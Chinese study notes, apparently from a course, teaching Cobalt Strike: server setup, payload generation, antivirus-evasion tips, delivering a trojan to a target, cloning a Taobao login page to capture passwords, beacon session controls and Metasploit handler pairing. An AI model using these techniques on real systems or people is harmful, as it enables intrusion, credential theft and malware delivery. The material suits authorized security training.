
>[!info] 学习目标
> 1. 认知| 说出HTA、Office宏、Stage/Stageless等各载荷的技术原理与差异
> 2. 技能| 能在Cobalt Strike中独立生成并部署上述载荷
> 3. 思想| 树立“先授权、再测试、后报告”的法律与伦理意识

## 工具简介
---
### 概述

**Cobalt Strike**（**简称CS**）是由美国的 Raphael Mudge 研发的一款专业的渗透测试工具。它是一款以 Metasploit 为基础的 GUI 框架式渗透工具，其社区版是 Armitage（一个 MSF 的图形化界面工具），可理解为 Armitage 的商业版。主要用于模拟高级黑客攻击（红队行动），帮助安全团队检测防御漏洞。

![[Pasted image 20250718182052.png]]

### 架构与平台支持

**采用 C/S 架构，分为客户端和服务端：**

服务端只能运行在 Linux 系统中，可搭建在 VPS 上；
客户端在 Windows、Linux、Mac 下都可以运行，但需要配置好 Java 环境。

**基础架构**

|   组件   | 说明                   | 类比       |
| :----: | -------------------- | -------- |
|  服务端   | 运行在Linux服务器上，管理所有会话  | 类似“指挥部”  |
|  客户端   | 团队成员连接的操作界面（Windows） | 类似“作战终端” |
| Beacon | 植入目标系统的隐藏程序（高级木马）    | 类似“卧底特工” |

### 主要功能

**多协议支持**
支持 DNS、HTTP、HTTPS、SMB 等多种协议进行主机上线，便于攻击者根据不同的网络环境和防御情况选择合适的通信方式。

**强大的木马生成能力**
能够生成多种类型的木马，包括 Windows EXE 程序、DLL 动态链接库、Java 程序以及 Office 宏代码等，可用于不同的攻击场景和目标系统。

**丰富的功能模块**
集成了端口转发、服务扫描、自动化溢出、提权、凭据导出、socket 代理、Office 攻击、文件捆绑、钓鱼等多种功能模块。例如，通过端口转发可以绕过防火墙限制，实现对内部网络的访问；利用钓鱼模块可以创建克隆网站、发送社工邮件等，骗取用户的敏感信息。

**团队协作能力**
支持团队分布式协作，多个攻击者可以同时连接到团队服务器上，共享攻击资源、目标信息和 Session，提高渗透测试的效率和成功率。

**用途与风险**
主要用于模拟真实攻击场景，帮助企业与组织挖掘自身网络防御的漏洞，提升网络安全防护水平。但如果被不法分子滥用，也可能成为网络攻击的工具，给网络安全带来严重威胁。因此，使用 Cobalt Strike 必须在合法合规、获取授权的前提下进行。

## 核心功能（常见版）
---
#### 1 主机控制

- 通过钓鱼邮件/漏洞利用等方式让目标上线
- 对上线主机进行远程操作（会话交互、文件管理）

#### 2 内网渗透

- 自动探测内网其他机器
- 跳板攻击（通过一台机器打其他机器）

#### 3 权限维持

- 在目标机器上留后门（重启后任有效）
- 隐藏自身避免被杀毒软件发现

#### 4 数据收集

- 获取密码、浏览器记录等敏感信息
- 自动整理成报告

## 基础工作流程
---

1. 架设服务器：在Linux安装团队服务器
2. 部署客户端：在window系统上部署，并连接服务器
3. 生成木马：制作一个免杀的可执行文件（.exe）
4. 诱骗执行：通过邮件/U盘等方式让目标运行
5. 目标上线：受害主机出现在CS控制台
6. 内网扩散：通过已控机器攻击其他内网设备

## 启动服务器
---

1）前面提到了CS的架构由服务端和客户端组成，下载安装CS文件包，服务器是指`server`文件夹，其内部包含名为`teamserver`的启动文件，如图所示：

![[Pasted image 20250719080737.png]]

2)在启动CS的客户端之前需要先启动CS的服务器，所以首先需要打开终端进入到`Server`文件夹，然后提升至管理员权限进行操作，服务器启动需要本机IP，因此可以顺带着查一下本机IP。如下图所示：

![[Pasted image 20250719081850.png]]

3）首次启动`teamserver`文件需要进行提权操作，需赋予服务器最高权限 -- 可读可写可执行，即完全控制权限。提权命令如下：

```bash
chmod 777 teamserver
```

**命令分解：**
- `chmod`：Linux权限修改命令（Change Mode）
- `777`：权限数字代码，表示最高权限（7 = 读 + 写 + 执行）
- `teamserver`：Cobalt Strike 的核心服务器组件，负责管理C2（命令与控制）通信

**权限含义解读（7 = 读 + 写 + 执行）**

| 权限  | 权限数值 | 作用  |
| :-: | :--: | :-: |
|  r  |  4   | 读取  |
|  w  |  2   | 写入  |
|  x  |  1   | 执行  |

**`777`解读（3个7分别代表什么）**

| 数字  | 权限          | 说明           |
| :-: | ----------- | ------------ |
|  7  | rwx(读+写+执行) | 所有者（Owner）   |
|  7  | rwx(读+写+执行) | 所属组（Group）   |
|  7  | rwx(读+写+执行) | 其他用户（Others） |

![[Pasted image 20250719082159.png]]

4）执行启动命令，启动CS服务器，命令如下：

```bash
./teamserver 主机IP 密码
```

![[Pasted image 20250719084919.png]]

> 注意：倘若未使用管理员权限操作该命令时将会报错，因此需要使用`sudo su`命令提升至管理员权限

**关闭服务器，则分为两种情况：**

如果`teamserver`是在当前终端直接启动的（前台运行），直接`Ctrl + C`即可终止；

如果`teamserver`关闭后端口占用（无法关闭），可以执行下述命令强制释放端口：

```bash
sudo netstat -tulnp | grep 50050  # 查找占用 50050 端口的进程
sudo kill -9 <PID>  # 终止对应进程
```

## 客户端连接服务端
---

1）下载安装CS文件包，服务器是指`server`文件夹，而客户端是指`Client`文件夹，其内部包含名为`Cobalt_Strike_CN.bat`的启动文件，如图所示：

![[Pasted image 20250719090713.png]]

2）打开终端进入`Client`文件夹，在终端执行`Cobalt_Strike_CN.bat`的启动文件，即可打开CS的我GUI界面，如图所示：

![[Pasted image 20250719091321.png]]

3）客户端界面的信息填写，这取决于启动服务器时的命令及返回信息，连接名称`Allas`、用户名`User`可以自定义，填写信息后点击`connect`即可进行连接。如下图所示：

![[Pasted image 20250719094523.png]]

4）成功进入后就可以进行CS的操作使用了，界面如下所示：

![[Pasted image 20250719095952.png]]

## payload攻击载荷
---

> **Payload = 真正用于干坏事的那一段代码**  
> 它负责在目标机器里“开门、偷数据、维持权限”——所有红队/渗透测试里让你“拿到 shell”的核心部分。

### 🧩 把一次攻击拆成 3 个角色

| 角色                | 类比   | 作用                     |
| ----------------- | ---- | ---------------------- |
| **Exploit**（利用）   | 撬锁工具 | 把门撬开，让我们能够进入房屋内部       |
| **Payload**（载荷）   | 小偷本人 | 门一开就挤进去，干正事（回连、提权、持久化） |
| **Listener**（监听器） | 接应车  | 停在门外等小偷出来，把他接回家        |

### 📦 Payload 长什么样？

| 常见形态                 | 例子                                 | 用途                |
| -------------------- | ---------------------------------- | ----------------- |
| 一段 **Shellcode**     | 几十字节 → 几百 KB 的 16 进制机器码            | 直接注入内存            |
| 一个 **EXE/DLL**       | beacon.exe、bind_beacon.dll         | 双击运行，反射加载         |
| 一条 **PowerShell 命令** | `powershell -nop -w hidden -c ...` | 无文件落地             |
| Office **宏**         | VBA 脚本                             | 打开文档即触发           |
| **HTA/HTML**         | `.hta` 文件                          | 双击即用 mshta.exe 执行 |


### 🎯 CS 里常见的 Payload 名字对照

|菜单里看到的|中文含义|典型场景|
|---|---|---|
|`windows/beacon_reverse_tcp`|**反向 TCP 木马**|肉鸡主动连你 4444|
|`windows/beacon_bind_tcp`|**正向 TCP 木马**|肉鸡开 4444 等你连|
|`windows/beacon_http/reverse_http`|**HTTP 回连木马**|走 80/443，像正常流量|
|`windows/beacon_dns/reverse_dns_txt`|**DNS 隧道木马**|网络只放行 53 端口时用|

### 1 载荷分类速览

![image.png](https://note.youdao.com/yws/public/resource/236b0410aa25f11016cb9e2a386b14d3/WEBRESOURCE0e13f5c4cb60006c881abe53afc96e83?ynotemdtimestamp=1757044485077)

|图标|名称|简称|典型文件扩展|Cobalt Strike 菜单路径|
|---|---|---|---|---|
|🏷️|HTA 文档|HTA|`.hta`|`Attacks > Packages > HTML Application`|
|📄|Office 宏|Macro|`.docm/.xlsm`|`Attacks > Packages > MS Office Macro`|
|🧩|Payload 生成器（Stageless）|Stageless|`.exe/.dll/.bin`|`Attacks > Packages > Windows Executable (Stageless)`|
|🧩|Windows 可执行程序（Stage）|Stage|`.exe/.dll`|`Attacks > Packages > Windows Executable`|
|🧩|Windows Stageless 生成所有负载|All Stageless|`.exe/.dll/.bin/.ps1/.vba`|`Attacks > Packages > Windows Stageless Generate All`|

### 2 载荷详解

#### 2.1 `HTA` 文档（HTML Application）

|项目|内容|
|---|---|
|原理|利用 `mshta.exe`（白名单程序）解析 `.hta` 文件，内部嵌入 VBScript/JavaScript，下载并执行 shellcode|
|优势|无需落地 EXE、利用白名单、可轻松嵌入钓鱼网页|
|劣势|仅 Windows；mshta 可能被新版 Defender 行为拦截|
|免杀技巧|1. 字符拼接混淆 2. 远程托管 shellcode（减少文件大小） 3. 使用短域名 CDN|
|演示命令|Cobalt Strike: `Attacks > Packages > HTML Application > ... > Generate`|

#### 2.2 `Office` 宏（VBA Macro）

|项目|内容|
|---|---|
|原理|在 `.docm/.xlsm` 中插入恶意 VBA，打开文档触发 `AutoOpen()`，内存加载 shellcode|
|优势|社工命中率高；宏内容可加密混淆；可嵌入图片/内容分散注意力|
|劣势|需要用户启用宏；Office 2016+ 默认拦截来自 Internet 的宏|
|免杀技巧|1. VBA 字符混淆 & ChrW() 拼接 2. 使用 Excel 4.0 宏混合调用 3. 设置受信任位置绕 GPO|
|演示命令|Cobalt Strike: `Attacks > Packages > MS Office Macro > Copy VBA`|

#### 2.3 `Stage` vs `Stageless`

| 维度               | Stage（小马）                             | Stageless（大马）                    |
| ---------------- | ------------------------------------- | -------------------------------- |
| 定义               | 分阶段：小体积 loader → 远程拉取 beacon.dll      | 单文件：完整 beacon 嵌入                 |
| 体积               | 几 KB ~ 几十 KB                          | 100 KB ~ 300 KB                  |
| 网络特征             | 需二次回连下载 beacon（易被 IDS 检测“分段下载”）       | 一次回连即可上线，流量更隐蔽                   |
| 适用场景             | 1. 钓鱼邮件附件需小体积 2. 利用 Office 宏/HTA 远程加载 | 1. 持久化服务 2. USB/物理投放 3. 无网络分段限制  |
| Cobalt Strike 菜单 | `Windows Executable`                  | `Windows Executable (Stageless)` |
>[!tips] 小马
>似于下载器，注入小马后会向CS服务端发起请求，下载真正的payload，且下载完成后将直接注入内存。（但是现在杀毒软件也将下载器标为恶意行为）

#### 2.3 Windows 可执行程序（EXE/DLL）

|项目|内容|
|---|---|
|原理|生成 PE 文件，启动后反射加载 beacon；支持 EXE/DLL/Service EXE|
|优势|灵活可控，可注册计划任务、服务持久化|
|劣势|静态特征明显，易被 AV 静态查杀|
|免杀技巧|1. 资源替换（图标、版本信息） 2. 加壳 + 动态解密 3. 自定义加载器 (PEzor, donut)|

#### 2.4 Windows Stageless 生成所有负载

|功能|一键批量生成：EXE(32/64)、DLL(32/64)、PowerShell、Raw Bin、VBA、HTA 等|
|---|---|
|场景|需要快速生成多平台、多格式载荷进行分发测试|
|输出|`./payloads` 目录，命名带 arch 与格式后缀|

### 3 一句话总结
---

|文件名/菜单项|一句话解释|像什么|
|---|---|---|
|HTA 文档|双击就弹网页，网页里藏木马|伪装的“网页快捷方式”|
|Office 宏|Word/Excel 里点“启用内容”就中马|藏在简历里的“小按钮”|
|Windows 可执行程序|最经典的“双击 EXE 就上线”|伪装的“安装包”|
|Stage vs Stageless|先下载 vs 一次性~~给~~全|看电视剧“分集缓存” vs “全集下载”|
|Payload 生成器|一键打包所有格式的“全家桶”|木马界的“瑞士军刀”|

## 生成木马
---

1）CS的木马程序需要与监听配合。在打开的CS界面进行监听器的添加，因为后续要使用监听器监听目标对象

![[Pasted image 20250717092216.png]]

2）创建`.exe`病毒文件，具体操作如下：

![[Pasted image 20250717093539.png]]

**关于`Windows Executable(E)`和`Windows Executable(S)`的区别：**

- `Windows Executable(E)`：带注册表和服务的木马，运行在服务器上，即使服务器重启也可以再次控制；
- `Windows Executable(S)`：无行为动作，无状态木马，运行在内存中，服务器重启后无法二次上线，优点时容易过杀毒软件，重启后将无法使用。

**`x64`复选框：**

- 勾选`Use x64 payload`将生成64位的程序（不能再32位电脑上运行）
- 不勾选将生成32位的程序（32位的可以在64位的电脑上运行）

<font color=red>(虚拟机文件拖入从右侧拖入)</font>

3）点击生成`Generate`按钮后将弹出文件存储路径，自定义路径保存后即可成功生成文件。

![[Pasted image 20250717094047.png]]

4）将病毒文件发送至目标主机，当主机开始执行后CS界面将出现回显，病毒文件执行前后CS界面对比如下：

![[Pasted image 20250717094749.png]]

![[Pasted image 20250717095046.png]]

5）对目标主机实现渗透，例如执行shell命令等，如下：

![[Pasted image 20250717095523.png]]

## 钓鱼网站生成
---

1）首先找一个目标网站，例如淘宝登录页面，如下图所示：

![[Pasted image 20250720215144.png]]

2）复制当前登录页面的网址URL，然后去CS里进行网站克隆，如下：

![[Pasted image 20250720215618.png]]

3）克隆成功后会以弹窗的形式展示克隆的URL，记得复制，如下图：

![[Pasted image 20250720215933.png]]

4）克隆的URL打开后显示界面与官方界面如出一辙，如下图所示：

![[Pasted image 20250720220059.png]]

5）此时假设我们假设输入账号和密码，如图：

![[Pasted image 20250720220601.png]]

6）当克隆后的URL被别人输入账号密码后，会将账号密码保存至web日志，如下：

![[Pasted image 20250720220809.png]]

## 会话列表可选项介绍
---

![[Pasted image 20250719143024.png]]

### 会话交互

会话交互就好比拿到了目标电脑的`cmd`命令权限！在输入Windows命令时在每个命令前需要添加 `shell` 前缀。例如`dir`命令如下：

```bash
shell dir
```

![[Pasted image 20250719144511.png]]

### 回连间隔

类似于反应时间，每隔指定的时长进行一次连接。可将其设置为0。

### 远程VNC

选择远程VNC功能，即可远程操作目标服务器。这里需要注意，默认情况下，我们只能监听对方电脑，但是不能直接操作对方鼠标进行远程操控（这是为了保证攻击操作不被受害人发现），若需要远程操控，需要点击`view only`黑客按钮。远程VNC也可以在终端输入`desktop`不加前缀`shell`也能够实现。

![[Pasted image 20250719145531.png]]

![[Pasted image 20250719150004.png]]

### 文件浏览

使用文件浏览可以对目标电脑实现一系列上传、下载、删除、创建等操作。

![[Pasted image 20250719150824.png]]

![[Pasted image 20250719151418.png]]

![[Pasted image 20250719151925.png]]

### 网络探测

检查当前局域网的共享主机，如果存在共享的话会在列表中显示出来。可在 视图-->目标列表 选项中查看探测到的主机信息。除了界面点击的方式外还可以直接在会话窗口执行`net view`命令也可以实现网络探测。

![[Pasted image 20250719152433.png]]

![[Pasted image 20250719153300.png]]

### 端口扫描

arp协议：属于数据链路层的协议，利用时很难被防火墙检测和发现；
icpm协议：属于ping协议，很难被检测发现

![[Pasted image 20250719153913.png]]

### 进程列表

可查看目标服务器的进程，kill杀死相关进程，或者进行token值伪造等等，功能比较强大。

![[Pasted image 20250719154631.png]]

## Cobalt strike插件

### 基本操作

1）打开工具包中的cs插件文件夹，解压放到电脑固定的路径
  ![[image-20240105133957509.png]]

2）点击CS界面的“脚本管理器”
  ![[image-20240105134159221.png]]

3）点击脚本管理器下方的“load”添加插件
  ![[image-20240105134522467.png]]

4）找到插件中的`.cna`为后缀的文件，选中，然后“打开”
  ![[image-20240105134754350.png]]

  状态栏出现“√”，即为成功
  ![[image-20240105134842265.png]]

5）添加完插件之后的状态，如下图
  ![[image-20240105135249168.png]]
  ![[image-20240105135403744.png]]


### 进阶操作

**CS和MSF联动**

  当我们使用CS生成的木马连接到目标服务器之后虽说CS功能比较强大，但是因为漏洞库和功能模块有限，所以最好的方法是联动kali系统的MSF，调用MSF强大的漏洞和功能库去做更多的操作。

**具体步骤**

1、kali启动MSF：

```bash
msfconsole
```

2、使用CS创建一个`Foreign HTTP`的监听。其中ip地址为MSF的ip地址，端口自定义

![[image-20231211165726441.png]]

3、MSF中设置监听：

```bash
# 选择工具
use exploit/multi/handler

# 设置监听的会话（注意会话类型要和CS的会话一致）
set payload windows/meterpreter/reverse_http

# 设置IP地址（IP地址为kali的监听的机器的IP地址，和CS中保持一致）
set lhost 192.168.xxx.xxx

# 设置端口（和CS中自定义的端口保持一致）
set lport 7777

# 开始监听
run                       
```

![[image-20231211172806766.png]]

4、CS中增加会话，选择MSF正在监听的会话

![[image-20231211180231306.png]]

5、选择MSF中正在监听的会话：

![[image-20231211180303485.png]]

6、选择完成之后，MSF就可以收到监听进入会话窗口了，CS成功和MSF实现联动。

![[image-20231211180322232.png]]